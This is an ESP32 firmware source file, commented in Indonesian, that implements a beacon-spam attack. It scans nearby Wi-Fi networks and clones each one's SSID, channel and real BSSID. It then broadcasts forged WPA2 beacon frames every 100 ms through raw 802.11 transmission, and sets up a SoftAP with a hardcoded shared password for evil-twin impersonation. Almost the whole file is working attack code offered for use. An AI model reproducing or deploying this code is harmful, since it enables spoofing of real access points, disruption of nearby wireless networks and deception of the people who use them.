/**
 * @file attack_beacon_spam.c
 * @author SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * @copyright Copyright (c) 2026
 * 
 * @brief Modifikasi Kustom: Mengambil data AP sekitar dan menyalin SSID beserta 
 *        MAC Address (BSSID) secara mutlak menggunakan enkripsi WPA2-PSK.
 */

#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_log.h"
#include <string.h>

// Jalur pencarian global ESP-IDF untuk komponen internal ap_scanner
#include "ap_scanner.h"

static const char *TAG = "beacon_spam_wpa2";
static esp_timer_handle_t beacon_timer_handle = NULL;

#define MAX_SPAM_APS 100

typedef struct {
    uint8_t ssid[33];
    uint8_t ssid_len;
    uint8_t bssid[6];
    uint8_t channel;
} custom_spam_ap_t;

static custom_spam_ap_t spam_pool[MAX_SPAM_APS];
static uint16_t active_spam_count = 0;

// Kata sandi tunggal global kustom sesuai instruksi Anda
static const char *GLOBAL_PASSWORD = "fX9!mK4$zQ2#vW9&tP7@jL2xN5*bV8%c";

/**
 * @brief Membuat dan mengirimkan raw packet beacon frame dengan dukungan enkripsi RSN WPA2
 */
static void build_and_send_wpa2_beacon(const custom_spam_ap_t *ap) {
    uint8_t packet[256] = {
        0x80, 0x00,                         // Type/Subtype: Beacon Frame
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast (Semua Perangkat)
    };

    // Salin MAC Address (BSSID) asli target secara utuh agar nama vendor 100% sama
    memcpy(&packet[10], ap->bssid, 6); // Transmitter Address
    memcpy(&packet[16], ap->bssid, 6); // BSSID

    packet[22] = 0x00;                  // Sequence Control Low
    packet[23] = 0x00;                  // Sequence Control High

    int index = 24;
    // Tanamkan 8-Byte Timestamp kosong
    memset(&packet[index], 0, 8);
    index += 8;

    // Beacon Interval standar (100ms)
    packet[index++] = 0x64;
    packet[index++] = 0x00;

    // Capability Info: Diubah ke PRIVACY (0x11 0x04) agar HP mendeteksi adanya enkripsi sandi
    packet[index++] = 0x11;
    packet[index++] = 0x04;

    // Element ID 0: Struktur teks SSID hasil klon
    packet[index++] = 0x00; 
    packet[index++] = ap->ssid_len;
    memcpy(&packet[index], ap->ssid, ap->ssid_len);
    index += ap->ssid_len;

    // Element ID 1: Supported Rates (Standar Radio)
    uint8_t sup_rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C };
    memcpy(&packet[index], sup_rates, sizeof(sup_rates));
    index += sizeof(sup_rates);

    // Element ID 3: Penyelarasan nomor Channel agar sama dengan target area
    packet[index++] = 0x03;
    packet[index++] = 0x01;
    packet[index++] = ap->channel;

    // Element ID 48: Injeksi RSN IE (Robust Security Network) Otentikasi WPA2-PSK (AES)
    uint8_t rsn_ie[] = {
        0x30, 0x14, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 
        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 
        0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00
    };
    memcpy(&packet[index], rsn_ie, sizeof(rsn_ie));
    index += sizeof(rsn_ie);

    // Atur radio internal ESP32 ke channel target sebelum menembakkan beacon
    esp_wifi_set_channel(ap->channel, WIFI_SECOND_CHAN_NONE);

    // Semprotkan raw packet langsung lewat driver nirkabel tingkat rendah
    esp_wifi_80211_tx(WIFI_IF_AP, packet, index, false);
}

/**
 * @brief Looping otomatis pengiriman beacon frame
 */
static void timer_send_beacon(void *arg) {
    if (active_spam_count == 0) return;

    for (int i = 0; i < active_spam_count; i++) {
        build_and_send_wpa2_beacon(&spam_pool[i]);
    }
}

void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
    // 1. Tarik total AP hasil tangkapan scanner lingkungan sekitar
    uint16_t scanned_count = ap_scanner_get_count();

    // 2. Daftarkan password kustom global ke sistem Wi-Fi SoftAP internal ESP32
    wifi_config_t ap_config;
    if (esp_wifi_get_config(WIFI_IF_AP, &ap_config) == ESP_OK) {
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
        strncpy((char *)ap_config.ap.password, GLOBAL_PASSWORD, 64);
        esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    }

    if (scanned_count == 0) {
        ESP_LOGW(TAG, "Daftar Scan Wi-Fi kosong! Menjalankan backup menggunakan nama default...");
        active_spam_count = 10;
        for (int i = 0; i < active_spam_count; i++) {
            snprintf((char *)spam_pool[i].ssid, 32, "ZTE-Clone_%d", i);
            spam_pool[i].ssid_len = strlen((char *)spam_pool[i].ssid);
            spam_pool[i].channel = 1 + (esp_random() % 11);
            for (int j = 0; j < 6; j++) spam_pool[i].bssid[j] = esp_random() & 0xFF;
            spam_pool[i].bssid[0] = (spam_pool[i].bssid[0] & 0xFE) | 0x02;
        }
    } else {
        active_spam_count = (scanned_count > MAX_SPAM_APS) ? MAX_SPAM_APS : scanned_count;
        ESP_LOGI(TAG, "Menduplikasi %d Jaringan sekitar dengan Identitas BSSID Asli Target...", active_spam_count);

        for (int i = 0; i < active_spam_count; i++) {
            const wifi_ap_record_t *record = ap_scanner_get_record(i);
            if (record != NULL) {
                // A. Kloning Nama Jaringan (SSID) asli target
                memcpy(spam_pool[i].ssid, record->ssid, 32);
                spam_pool[i].ssid[32] = '\0';
                spam_pool[i].ssid_len = strlen((char *)spam_pool[i].ssid);
                
                // B. Kloning Jalur Frekuensi (Channel) asli target
                spam_pool[i].channel = record->primary;

                // C. KLONING TOTAL MAC ADDRESS (BSSID): Menyalin data fisik asli target secara mutlak
                memcpy(spam_pool[i].bssid, record->bssid, 6); 
            }
        }
    }

    // 3. Daftarkan dan hidupkan timer internal pengiriman biner
    if (beacon_timer_handle == NULL) {
        const esp_timer_create_args_t args = { .callback = &timer_send_beacon, .name = "wpa2_spam_timer" };
        ESP_ERROR_CHECK(esp_timer_create(&args, &beacon_timer_handle));
        ESP_ERROR_CHECK(esp_timer_start_periodic(beacon_timer_handle, 100000)); // Pemancaran stabil setiap 100ms
    }
    
    ESP_LOGI(TAG, "Serangan Duplikasi Identitas Sempurna Aktif! Sandi Global: %s", GLOBAL_PASSWORD);
}

void attack_beacon_spam_stop(void) {
    if (beacon_timer_handle != NULL) {
        esp_timer_stop(beacon_timer_handle);
        esp_timer_delete(beacon_timer_handle);
        beacon_timer_handle = NULL;
    }
    active_spam_count = 0;
    ESP_LOGI(TAG, "Serangan Duplikasi Beacon dihentikan.");
}
